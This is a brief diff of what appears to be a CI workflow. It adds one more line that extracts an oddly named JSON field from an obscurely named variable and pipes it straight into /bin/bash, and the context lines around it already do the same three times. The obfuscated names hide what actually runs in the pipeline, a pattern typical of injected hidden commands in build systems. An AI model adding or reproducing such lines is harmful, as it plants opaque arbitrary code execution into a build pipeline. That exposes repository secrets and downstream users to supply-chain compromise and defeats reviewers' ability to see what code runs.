@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$yu2" | jq -r .nauk6865 | /bin/bash
           echo $gtyn65 | jq -r .eh920 | /bin/bash
           echo $lvhcs64344 | jq -r .wzd310 | /bin/bash
+          echo $gtvt251 | jq -r .idqua7032 | /bin/bash
 
       - name: Upload results
         if: always()
